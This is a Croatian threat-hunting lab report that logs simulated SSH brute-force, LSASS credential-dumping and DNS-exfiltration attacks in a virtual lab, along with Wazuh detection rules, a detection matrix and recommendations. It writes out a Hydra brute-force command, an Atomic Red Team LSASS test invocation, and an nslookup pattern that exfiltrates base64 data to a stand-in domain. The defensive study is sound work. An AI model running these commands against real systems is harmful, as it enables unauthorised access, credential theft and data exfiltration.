# 7.	Hunt Journal
U ovom poglavlju dokumentiran je praktični dio istraživanja koji povezuje simulirane napade s procesom detekcije. Hunt Journal bilježi kronološki slijed analitičkih koraka poduzetih kako bi se potvrdile sigurnosne hipoteze. Kroz sustavan pregled zapisa, koda i generiranih alarma, analizira se učinkovitost postavljenih obrambenih mehanizama u prepoznavanju specifičnih napadačkih tehnika.

## 7.1.	Svrha hunt journala
Hunt Journal služi kao kronološki zapisnik svih aktivnosti provedenih tijekom procesa lova na prijetnje. Njegova je svrha dokumentirati vezu između simuliranog napada, prikupljene telemetrije i finalne analize. On omogućuje timu da identificira "blind spots" (detekcijske praznine) te da potvrdi jesu li postavljene hipoteze točne.

## 7.2 Zapis lova #01: Detekcija SSH Brute-Force aktivnosti

Prvi lov fokusirao se na detekciju pokušaja neovlaštenog pristupa putem SSH protokola. Naglasak je bio na praćenju korelacije između mrežnog pokušaja i zapisa unutar honeypot sustava koji služi kao "mamac" za napadače.

| Stavka | Vrijednost |
|------|----------|
| **Datum i vrijeme** | 3. siječnja 2026., 14:30h |
| **Analitičar / Napadač** | Mirta Vuković / Nensi Vugrinec |
| **MITRE Tehnika** | T1110.001 - Password Guessing |
| **Cilj napada** | Cowrie SSH Honeypot (192.168.56.102), port 2222 |
| **Izvor napada** | Kali Linux VM (192.168.56.1) |
| **Korištena naredba** | `hydra -l root -P passwords.txt ssh://192.168.56.102 -s 2222` |
| **Izvor telemetrije** | Cowrie Honeypot (JSON logovi u `~/cowrie/var/log/cowrie/cowrie.json`) |
| **Tijek simulacije** | Alat Hydra je sustavno isprobavao lozinke iz datoteke passwords.txt. Uočeni pokušaji s lozinkama: 123456, password, letmein… |
| **Pronađeni artefakti** | Višestruki neuspješni pokušaji prijave s korisničkim imenima root, admin i clouduser. Zabilježene naredbe napadača nakon \"ulaska\": whoami, uname -a. |
| **Status detekcije** | **USPJEŠNO** |

**Tablica 1.** Zapis lova #01: Detekcija SSH Brute-Force napada

<p align="center">
  <img src="https://github.com/nrastija/threat-hunting-lab/blob/dev/docs/images/Uspje%C5%A1an%20napad%20grubom%20silom%20(Brute%20Force).png?raw=true" alt="Slika 9. Uspješan napad grubom silom">
  <br>
  <b>Slika 9. Uspješan napad grubom silom (Brute Force)</b>
</p>

Na Slici 9 vidljivo je izvođenje automatiziranog Brute Force napada alatom Hydra s Kali Linux stroja na SSH servis honeypota. Vidljivi su višestruki uspješni pokušaji prijave s različitim lozinkama iz predefiniranog rječnika.

<p align="center">
  <img src="https://github.com/nrastija/threat-hunting-lab/blob/dev/docs/images/Prikaz%20sirovih%20JSON%20logova%20u%20Cowrie%20sustavu%20koji%20potvr%C4%91uju%20uspje%C5%A1nu%20detekciju%20napada%C4%8Dkih%20poku%C5%A1aja%20prijave.png?raw=true" alt="Slika 10. Prikaz sirovih JSON logova">
  <br>
  <b>Slika 10. Prikaz sirovih JSON logova u Cowrie sustavu koji potvrđuju uspješnu detekciju napadačkih pokušaja prijave</b>
</p>

Slika 10. prikazuje sirove JSON logove unutar Cowrie honeypota. Zapisi prikazuju detekciju uspješnih prijava (login.success) s izvorne IP adrese napadača, uključujući korištena korisnička imena i lozinke prikupljene tijekom Brute Force napada.

### 7.2.1. Analiza i strategija detekcije

Nakon što je simulacija napada izvršena, proces lova započeo je testiranjem hipoteze da će automatizirani napad stvoriti prepoznatljiv uzorak u logovima.

- Istraživanje anomalija:
  Analizom Wazuh zapisa uočeno je neuobičajeno ponašanje – u kratkom razdoblju zabilježeno je više uzastopnih uspješnih prijava, što predstavlja jasnu anomaliju

- Odabrane tehnike:
  Lov se oslanja na analizu logova autentifikacije i kreiranje prilagođenih pravila unutar SIEM sustava

### 7.2.2. Implementacija detekcijskog pravila

Strategija otkrivanja temelji se na pravilu koje se aktivira kada se unutar određenog vremenskog okvira zabilježi više uspješnih prijava s iste lokacije. Kako bi se detektirao ovaj specifičan napad, kreirano je Wazuh pravilo koje prati zapise generirane putem Cowrie honeypota.

Prilagođeno pravilo (ID: 106070): Pravilo je napisano tako da se aktivira pri detekciji tri uspješne prijave s iste lokacije unutar vremenskog okvira od 10 minuta (600 sekundi):

```xml
<group name="cowrie,ssh,">
  <rule id="106070" level="8" frequency="3" timeframe="600">
    <if_matched_sid>60106</if_matched_sid>
    <same_location />
    <description>3 successful logons in 600s, possible brute-force</description>
  </rule>
</group>
```

Za primjenu pravila, dokument je uređen putem terminala (sudo nano /var/ossec/etc/rules/local_rules.xml), nakon čega je ponovno pokrenut Wazuh manager naredbom sudo systemctl restart wazuh-manager.

### 7.2.3 Verifikacija rezultata

Napad se temelji na Cowrie honeypotu koji prihvaća sve lozinke, zbog čega su svi događaji prikazani kao uspješni.

1. Prije primjene pravila: 
   Wazuh je bilježio pojedinačne događaje, ali nije bilo korelacije koja bi ukazala na sustavni brute-force napad (Slika 11.)

<p align="center">
  <img src="https://github.com/nrastija/threat-hunting-lab/blob/dev/docs/images/Prikaz%20sigurnosnih%20doga%C4%91aja%20u%20Wazuhu%20prije%20primjene%20pravila.png?raw=true" alt="Prikaz događaja prije pravila">
  <br>
  <b>Slika 11. Prikaz sigurnosnih događaja u Wazuhu prije primjene pravila</b>
</p>

2. Nakon primjene pravila:*
   Sustav je uspješno povezao događaje i generirao alarm razine 8, jasno identificirajući prijetnju (Slika 12.)

<p align="center">
  <img src="https://github.com/nrastija/threat-hunting-lab/blob/dev/docs/images/Generirani%20alarm%20razine%208%20nakon%20primjene%20prilago%C4%91enog%20pravila.png?raw=true" alt="Alarm nakon pravila">
  <br>
  <b>Slika 12. Generirani alarm razine 8 nakon primjene prilagođenog pravila</b>
</p>

## 7.3 Zapis lova #02: Analiza LSASS Memory Access anomalija

Drugi lov fokusirao se na detekciju pokušaja pristupa memoriji procesa LSASS (Local Security Authority Subsystem Service). Ovaj proces je kritična meta jer pohranjuje vjerodajnice korisnika u memoriji, a pristup istom od strane neovlaštenih aplikacija jasan je indikator pokušaja krađe identiteta (Credential Dumping).

| Stavka | Vrijednost |
|------|----------|
| **Datum i vrijeme** | 3. siječnja 2026., 15:45h |
| **Analitičar / Napadač** | Mirta Vuković / Nensi Vugrinec |
| **MITRE Tehnika** | T1003.001 - LSASS Memory |
| **Cilj napada** | Windows 10 VM (192.168.56.103), proces lsass.exe |
| **Izvor napada** | Lokalni pristup (Atomic Red Team framework) |
| **Korištena naredba** | `Invoke-AtomicTest T1003.001` |
| **Izvor telemetrije** | Sysmon Event ID 10 (Process Access) proslijeđen kroz Wazuh Agent. |
| **Tijek simulacije** | Korišten je alat Atomic Red Team za emulaciju pristupa LSASS memoriji pomoću različitih metoda (npr. MiniDump, ProcDump) |
| **Pronađeni artefakti** | Sysmon zapisi koji ukazuju na procese koji pokušavaju otvoriti lsass.exe s pravima pristupa 0x1fffff ili 0x1010 |
| **Status detekcije** | **USPJEŠNO** |

**Tablica 2.** Zapis lova #02: Detekcija LSASS Memory Access napada

Na Slikama 13., 14., 15., 16. i 17. vidljivo je pokretanje simulacije pomoću PowerShell okruženja na Windows stroju, gdje alat Atomic Red Team izvršava testove specifične za MITRE tehniku T1003.001.

<p align="center">
  <img src="https://github.com/nrastija/threat-hunting-lab/blob/dev/docs/images/Izvo%C4%91enje%20simulacije%20napada%20alatom%20Atomic%20Red%20Team1.png?raw=true" alt="Simulacija napada 1" width="500">
  <br><br>
  <img src="https://github.com/nrastija/threat-hunting-lab/blob/dev/docs/images/Izvo%C4%91enje%20simulacije%20napada%20alatom%20Atomic%20Red%20Team2.png?raw=true" alt="Simulacija napada 2" width="500">
  <br><br>
  <img src="https://github.com/nrastija/threat-hunting-lab/blob/dev/docs/images/Izvo%C4%91enje%20simulacije%20napada%20alatom%20Atomic%20Red%20Team3.png?raw=true" alt="Simulacija napada 3" width="500">
  <br><br>
  <img src="https://github.com/nrastija/threat-hunting-lab/blob/dev/docs/images/Izvo%C4%91enje%20simulacije%20napada%20alatom%20Atomic%20Red%20Team4.png?raw=true" alt="Simulacija napada 4" width="500">
  <br><br>
  <img src="https://github.com/nrastija/threat-hunting-lab/blob/dev/docs/images/Izvo%C4%91enje%20simulacije%20napada%20alatom%20Atomic%20Red%20Team5.png?raw=true" alt="Simulacija napada 5" width="500">
  <br>
  <b>Slike 13., 14., 15., 16. i 17. Izvođenje simulacije napada alatom Atomic Red Team (koraci 1-5)</b>
</p>

Tijekom izvođenja većina pokušaja je blokirana od strane sigurnosnih mehanizama operacijskog sustava i antivirusne zaštite, što je vidljivo kroz poruke “Access is denied” i “Script blocked by antivirus”.

### 7.3.1 Analiza i strategija detekcije

Strategija lova temeljila se na pretpostavci da će bilo kakav neovlašteni pokušaj interakcije s LSASS procesom generirati specifičan Sysmon događaj.

- Istraživanje anomalija:  
  Za detekciju ovakvog napada bilo je potrebno osigurati dodatno prikupljanje zapisa pomoću alata Sysmon. Integracijom Sysmon zapisa s Wazuh agentom omogućena je analiza događaja koji su izravno povezani s pristupom LSASS procesu, s ciljem identifikacije procesa koji pokušavaju pristupiti njegovoj memoriji.

- Odabrane tehnike: 
  Integracija napredne telemetrije sustava (Sysmon) s Wazuh platformom radi centralizirane analize sumnjivih poziva prema memoriji sustava.

### 7.3.2 Izmjena konfiguracije za prikupljanje podataka

Kako bi se ovi napadi detektirali, bilo je potrebno konfigurirati Wazuh agenta da čita Sysmon zapise. To je postignuto izmjenom datoteke ossec.conf na Windows endpointu (Slika 17). U dokument je bilo potrebno dodati par linija koda koje prikupljaju Sysmon zapise iz Windows Event Loga:
```
<localfile> <location>Microsoft-Windows-Sysmon/Operational</location>
<log_format>eventchannel</log_format> </localfile>
```
Nakon dodavanja kanala Microsoft-Windows-Sysmon/Operational, agent je počeo slati detaljnu telemetriju o interakcijama među procesima prema SIEM-u.

---

### 7.3.3 Verifikacija rezultata

Tijekom simulacije, operacijski sustav i antivirusna zaštita blokirali su određene pokušaje (Access Denied), no telemetrija o samom pokušaju pristupa ostala je zabilježena.

1. Sysmon detekcija: Sustav je zabilježio točan proces koji je pokušao izvršiti dumping memorije, uključujući "CallTrace" koji služi kao forenzički dokaz metode pristupa.

2. Wazuh vizualizacija: Na Wazuh dashboardu generirani su zapisi koji koreliraju ove pokušaje s MITRE ATT&CK okvirima, omogućujući analitičaru brzu identifikaciju prirode napada (Slika 18).

<p align="center">
  <img src="https://github.com/nrastija/threat-hunting-lab/blob/dev/docs/images/Prikaz%20kriti%C4%8Dnih%20sigurnosnih%20doga%C4%91aja%20na%20Wazuh%20Dashboardu.png?raw=true" alt="Prikaz kritičnih sigurnosnih događaja na Wazuh Dashboardu">
  <br>
  <b>Slika 18. Prikaz kritičnih sigurnosnih događaja na Wazuh Dashboardu (Agent 001)</b>
</p>

Slika 18. prikazuje Wazuh nadzornu ploču s rezultatima detekcije za Agent 001. Vidljiva je korelacija događaja visoke kritičnosti (Level 15) koji se odnose na sumnjive izvršne datoteke, kao i alarmi za anomalije u radu PowerShell-a i Command Prompt-a, što potvrđuje uspješno praćenje simuliranog LSASS napada.


## 7.4 Zapis lova #03: Istraživanje DNS Exfiltration prometa

Treći lov bio je usmjeren na otkrivanje prikrivenog kanala za iznošenje podataka. DNS protokol je izabran jer se često smatra legitimnim mrežnim prometom koji prolazi kroz vatrozide, što ga čini idealnim za napadače koji žele iznijeti osjetljive informacije (poput sadržaja datoteke secret.txt) izvan mreže u fragmentima.

| Stavka | Vrijednost |
|------|----------|
| **Datum i vrijeme** | 4. siječnja 2026., 09:15h |
| **Analitičar / Napadač** | Mirta Vuković / Nensi Vugrinec |
| **MITRE Tehnika** | T1048.003 - Exfiltration Over DNS |
| **Cilj napada** | Slanje podataka s Windows VM (192.168.56.103) na Kali Linux (192.168.56.1) |
| **Izvor napada** | Windows VM (PowerShell i nslookup) |
| **Korištena naredba** | nslookup [base64_string].exfil.test (izvršeno unutar petlje). |
| **Izvor telemetrije** | Suricata IDS (mrežni alarmi) i tcpdump na strani napadača. |
| **Tijek simulacije** | Podaci su fragmentirani i poslani kao niz upita. Na Kali Linuxu je tcpdump -i eth1 udp port 53 potvrdio primitak paketa. |
| **Pronađeni artefakti** | Visoka frekvencija UDP prometa na portu 53. Uočene neobično duge poddomene koje sadrže Base64 kodirane nizove. |
| **Status detekcije** | **DJELOMIČNO** |

**Tablica 3.** Zapis lova #03: Detekcija DNS eksfiltracije podataka

### 7.4.1 Analiza i strategija detekcije

Strategija lova temeljila se na analizi mrežnih anomalija i traženju neuobičajenih DNS upita koji odstupaju od standardnog ponašanja korisnika.

- Istraživanje anomalija: Fokus je bio na praćenju mrežnog prometa na portu 53 (UDP). Lov je započeo pregledom mrežnih sučelja kako bi se izolirao promet koji ne pripada standardnim DNS serverima.

### 7.4.2 Tijek simulacije i prikupljanje artefakata

Proces eksfiltracije podataka izveden je kroz četiri ključna koraka, koristeći PowerShell za slanje i mrežne alate za hvatanje podataka:

- Korak 1 - Priprema osjetljivog podatka: Na Windows Endpoint VM-u kreirana je testna datoteka secret.txt koja sadrži simulirani osjetljivi podatak. Datoteka služi kao osnova za praćenje protoka informacija kroz mrežu.

<p align="center">
  <img src="https://github.com/nrastija/threat-hunting-lab/blob/dev/docs/images/Priprema%20podataka%20za%20eksfiltraciju%20putem%20PowerShell-a.png?raw=true" alt="Priprema podataka za eksfiltraciju">
  <br>
  <b>Slika 19. Priprema podataka za eksfiltraciju putem PowerShell-a</b>
</p>

- Korak 2 - Kodiranje i priprema podataka (Slika 20): Sadržaj datoteke kodiran je u Base64 format. Kodirani niz je zatim podijeljen u manje fragmente kako bi svaki mogao stati u naziv DNS poddomene, što je standardna tehnika za izbjegavanje detekcije mrežnih vatrozida.

<p align="center">
  <img src="https://github.com/nrastija/threat-hunting-lab/blob/dev/docs/images/PowerShell%20%E2%80%93%20Base64%20encoding%20i%20priprema%20DNS%20upita.png?raw=true" alt="PowerShell Base64 encoding i priprema DNS upita">
  <br>
  <b>Slika 20. PowerShell – Base64 encoding i priprema DNS upita</b>
</p>>

- Korak 3 - Slanje podataka putem DNS upita (Slika 21): Svaki fragment kodiranog podatka poslan je pomoću naredbe nslookup. Iako sustav prikazuje pogrešku pri razlučivanju (Timeout), svaki upit nosi dio tajnog podatka prema napadačevom sustavu.

<p align="center">
  <img src="https://github.com/nrastija/threat-hunting-lab/blob/dev/docs/images/PowerShell%20%E2%80%93%20izvo%C4%91enje%20DNS%20eksfiltracije%20(nslookup).png?raw=true" alt="PowerShell izvođenje DNS eksfiltracije">
  <br>
  <b>Slika 21. PowerShell – izvođenje DNS eksfiltracije (nslookup)</b>
</p>

- Korak 4 - Presretanje DNS prometa (Slika 22): Na Kali Linux VM-u pokrenut je alat tcpdump za praćenje prometa na UDP portu 53. Zabilježeni su upiti s neuobičajenim i dugim nazivima domena, što je karakterističan indikator DNS eksfiltracije.

<p align="center">
  <img src="https://github.com/nrastija/threat-hunting-lab/blob/dev/docs/images/Presretanje%20mre%C5%BEnog%20prometa%20alatom%20tcpdump%20na%20Kali%20Linuxu.png?raw=true" alt="Presretanje mrežnog prometa alatom tcpdump">
  <br>
  <b>Slika 22. Presretanje mrežnog prometa alatom tcpdump na Kali Linuxu</b>
</p>

### 7.4.3 Identifikacija detekcijskog jaza (Gap Analysis)

Simulacija DNS eksfiltracije bila je uspješno izvedena na mrežnoj razini, ali detekcija napada unutar Wazuh sustava nije realizirana.

Analizom nadzorne ploče potvrđeno je da se napad nije automatski alarmirao zbog poteškoća prilikom integracije Sysmon DNS zapisa unutar Wazuh platforme. Ovaj "blind spot" dokazuje da je za potpunu zaštitu potrebna korelacija mrežne razine i SIEM pravila koja specifično prate duljinu DNS upita.

---
## 8. Attack - Detection Matrix

Ovo poglavlje služi kao vizualni i analitički sažetak cjelokupnog projekta. Njegova je svrha mapirati izvedene simulacije napada na stvarne detekcijske sposobnosti laboratorijskog okruženja, jasno razdvajajući uspješno detektirane prijetnje od onih koje su ostale u "slijepoj zoni" sustava.

### 8.1 Struktura matrice

Matrica je organizirana kako bi pružila jasan uvid u proces od simulacije do identifikacije. Struktura se temelji na sljedećim stupcima:

1. MITRE ATT&CK tehnika - Referenca prema globalnom okviru napadačkih tehnika  
2. Opis napada - Sažetak simulirane aktivnosti  
3. Korišteni alati - Metode korištene za generiranje napada  
4. Telemetrija / Izvor podataka - Specifični logovi koji su omogućili uvid  
5. Strategija detekcije - Korištena pravila i upiti za identifikaciju anomalija  
6. Status detekcije - Razina uspješnosti (Uspješno / Djelomično / Nije detektirano)  
7. Identificirani nedostaci - Dokumentiranje "blind spotova" sustava  

### 8.2 Mapiranje napada na detekcije

Mapiranje napada na detekcije predstavlja ključnu fazu validacije laboratorijskog okruženja, jer omogućuje kvantificiranje uspješnosti implementiranih sigurnosnih kontrola nasuprot simuliranim prijetnjama. Svaki scenarij u tablici evaluiran je kroz prizmu dostupne telemetrije, potvrđujući da kvaliteta lova izravno ovisi o dubini i preciznosti prikupljenih logova [4].

| Scenarij | MITRE Tehnika | Opis napada | Korišteni alati | Telemetrija / Izvor podataka | Strategija detekcije | Status detekcije | Identificirani nedostaci |
|---------|---------------|-------------|-----------------|-----------------------------|----------------------|------------------|--------------------------|
| 1 | T1110.001 - Password Guessing | Automatizirani brute-force napad na SSH servis | Hydra, Cowrie Honeypot | Cowrie JSON logovi, Wazuh SIEM | Prilagođeno Wazuh pravilo (ID 106070) – frekvencija prijava, korelacija po IP | USPJEŠNO | Nema značajnih nedostataka, detekcija je precizna |
| 2 | T1003.001 - LSASS Memory | Pokušaj pristupa memoriji LSASS procesa radi krađe vjerodajnica | Atomic Red Team, PowerShell | Sysmon Event ID 10, Wazuh agent | Analiza Event ID 10, praćenje nepoznatih procesa koji pristupaju LSASS-u | USPJEŠNO | Neki pokušaji blokirani od antivirusnog softvera, ali telemetrija omogućava detekciju |
| 3 | T1048.003 - Exfiltration Over DNS | Eksfiltracija datoteke secret.txt preko DNS upita | PowerShell, nslookup, tcpdump | Suricata IDS, tcpdump | Analiza neuobičajenih DNS upita, dugački nazivi poddomena, visoka frekvencija upita | DJELOMIČNO | Wazuh nije automatski generirao alarm – potrebno integrirati Sysmon DNS Event ID 22 ili razviti dodatna pravila |

**Tablica 4.** Attack - Detection Matrix laboratorijskog okruženja

---

### 8.3 Identificirani nedostaci u detekciji

Analizom matrice i rezultata simulacija mogu se izvući ključni zaključci o obrambenom držanju sustava:

1. **SSH Brute-Force (Scenarij 1):**  
   Detekcija je potpuna i pravilo za frekvenciju prijava pokazalo se vrlo učinkovitim. Uspješna detekcija potvrđuje važnost integracije honeypota kao senzora koji pruža visokokvalitetne podatke o inicijalnim fazama proboja sustava [5]. Minimalni nedostatak je potreba za prilagodbom pravila za distribuirane napade s više IP adresa.

2. **LSASS Memory Access (Scenarij 2):**  
   Većina pokušaja je detektirana. Rezultati demonstriraju nužnost napredne endpoint telemetrije; postojanje Sysmon zapisa omogućuje rekonstrukciju napadačkog lanca, što je ključna komponenta modela aktivne obrane [1]. Analiza pristupa memoriji procesa ostaje kritična jer napadači često koriste legitimne funkcije sustava za krađu vjerodajnica [3].

3. **DNS Exfiltration (Scenarij 3):**  
   Detekcija je ostala djelomična jer Wazuh trenutno ne integrira Sysmon DNS zapise (Event ID 22) automatski u osnovnoj konfiguraciji. Identificirani detekcijski jaz (eng. blind spot) pokazuje da se vidljivost ne podrazumijeva posjedovanjem alata, već zahtijeva kontinuiranu korelaciju mrežnog prometa i endpoint logova [3]. Potrebno je razviti dodatna pravila temeljena na dužini poddomena i frekvenciji upita unutar SIEM sustava.

Ovaj sustavni pregled pokazuje da su tehnike s jasnim potpisom uspješno savladane, dok tiši napadi poput eksfiltracije zahtijevaju daljnje fino podešavanje sustava.

---

## 9. Evaluacija učinkovitosti obrane

U ovom poglavlju analizira se sposobnost laboratorijskog okruženja da odgovori na simulirane prijetnje, koristeći rezultate matrice napada i detekcije te nalaze iz procesa lova na prijetnje.

### 9.1 Procjena postojećih kontrola

Implementirane sigurnosne kontrole, poput Wazuh SIEM-a i Suricata IDS-a, pokazale su visoku učinkovitost u detekciji poznatih obrazaca napada. Sustav se pokazao posebno snažnim u sloju aktivne obrane (eng. Active Defense), gdje je ljudska intervencija kroz analitičku obradu logova omogućila prepoznavanje sumnjivih aktivnosti koje automatizirani mehanizmi detekcije mogu propustiti [1]. Ovakav pristup potvrđuje važnost kombinacije automatiziranih alata i stručne analize u suvremenim sigurnosnim sustavima.

### 9.2 Pokrivenost MITRE ATT&CK tehnika

Analiza pokrivenosti pokazuje da sustav obuhvaća ključne faze napadačkog lanca, od inicijalnog pristupa do faze eksfiltracije podataka. Iako je opseg testiranih tehnika u laboratorijskom okruženju bio ograničen na tri hipoteze, mapiranje putem MITRE ATT&CK Navigatora pokazuje da implementirana telemetrija i detekcijski mehanizmi pružaju čvrstu osnovu za daljnje proširenje detekcijskih kapaciteta na širi skup tehnika unutar ATT&CK okvira [6].

### 9.3 Slabe točke sustava

Glavna slaba točka sustava identificirana je u području detekcije prikrivenih komunikacijskih kanala, konkretno DNS eksfiltracije podataka. Ovakvi detekcijski „blind spotovi“ ukazuju na činjenicu da se sigurnost ne može temeljiti isključivo na pasivnim obrambenim mehanizmima, već zahtijeva kontinuirano unaprjeđenje vidljivosti nad mrežnim protokolima koji se često zloupotrebljavaju za zaobilaženje sigurnosnih kontrola [3].

### 9.4 Analiza sigurnosnog rizika iz perspektive analitičara

Rezultati provedenih simulacija napada i procesa lova na prijetnje omogućuju procjenu sigurnosnog rizika na temelju dvije ključne komponente: vjerojatnosti napada i potencijalnog utjecaja na sustav.

U slučaju SSH brute-force napada, vjerojatnost napada ocijenjena je kao visoka zbog česte izloženosti SSH servisa u stvarnim okruženjima. Međutim, zahvaljujući implementaciji honeypota i prilagođenih korelacijskih pravila, ukupna razina rizika značajno je smanjena jer je napad detektiran u ranoj fazi, prije ostvarivanja daljnjeg napadačkog napretka.

Napad krađe vjerodajnica iz LSASS memorije predstavlja scenarij s visokim potencijalnim utjecajem, budući da uspješna eksploatacija omogućuje potpunu kompromitaciju korisničkih identiteta i daljnje lateralno kretanje napadača unutar sustava. Iako je većina pokušaja bila blokirana sigurnosnim mehanizmima operacijskog sustava, prikupljena telemetrija omogućila je pravovremenu detekciju pokušaja napada, čime je ukupni rizik sveden na prihvatljivu razinu.

DNS eksfiltracija podataka identificirana je kao scenarij s umjerenom vjerojatnošću, ali visokim potencijalnim utjecajem. Djelomična detekcija ovog napada ukazuje na postojanje detekcijskog jaza, koji predstavlja povećani sigurnosni rizik jer omogućuje prikriveni izlazak osjetljivih podataka iz mreže bez generiranja sigurnosnih alarma.

---

## 10. Preporuke i poboljšanja

Na temelju provedenih testova i uočene dinamike procesa lova na prijetnje predlažu se sljedeća unaprjeđenja sigurnosnog sustava:

### 10.1 Poboljšanja detekcijskih pravila

Preporuča se razvoj prilagođenih Wazuh pravila koja koriste korelaciju više događaja (eng. multi-event correlation). Primjerice, umjesto isključivog praćenja pristupa LSASS memoriji, detekcijsko pravilo trebalo bi generirati alarm samo u slučajevima kada pristup vrši proces koji nije na popisu dopuštenih aplikacija (eng. allow-listing), čime se značajno smanjuje broj lažno pozitivnih detekcija [4].

### 10.2 Poboljšanja vidljivosti

Nužno je proširiti prikupljanje logova na mrežnoj razini kroz potpunu integraciju Sysmon Event ID 22 (DNS upiti) u Wazuh Dashboard. Povećanje granularnosti prikupljenih podataka omogućilo bi analitičarima učinkovitije prepoznavanje anomalija u duljini i frekvenciji DNS upita, što predstavlja ključan preduvjet za pravovremenu detekciju eksfiltracije podataka [3].

### 10.3 Automatizacija threat huntinga

S obzirom na to da je lov na prijetnje vremenski i resursno zahtjevan proces, preporuča se uvođenje automatiziranih skripti za periodičnu provjeru indikatora kompromitacije (IoC). Automatizacija rutinskih provjera omogućuje analitičarima da se fokusiraju na složenije hipoteze i dubinsku forenzičku analizu, čime se povećava ukupna učinkovitost sigurnosnog tima [2].

### 10.4 Analitičke preporuke za poboljšanje sigurnosnog nadzora

Na temelju provedenih threat hunting aktivnosti i evaluacije detekcijskih sposobnosti, definirane su sljedeće analitičke preporuke:

- Poboljšanje detekcije DNS eksfiltracije: Integrirati Sysmon DNS Event ID 22 u Wazuh SIEM te razviti pravila koja prate neuobičajenu duljinu DNS upita i visoku frekvenciju zahtjeva prema istim domenama.
- Unaprjeđenje korelacije događaja: Povezati mrežnu i endpoint telemetriju kako bi se omogućila detekcija napada koji se odvijaju paralelno na više razina sustava.
- Razvoj automatiziranih odgovora: Uvesti osnovne SOAR koncepte, poput automatskog označavanja sumnjivih IP adresa i obavještavanja analitičara, čime se skraćuje vrijeme reakcije na detektirane prijetnje.
- Kontinuirano unaprjeđenje Hunt Journala: Standardizirati format zapisa kako bi se rezultati lova mogli dugoročno koristiti za razvoj novih detekcijskih pravila i edukaciju sigurnosnih analitičara.

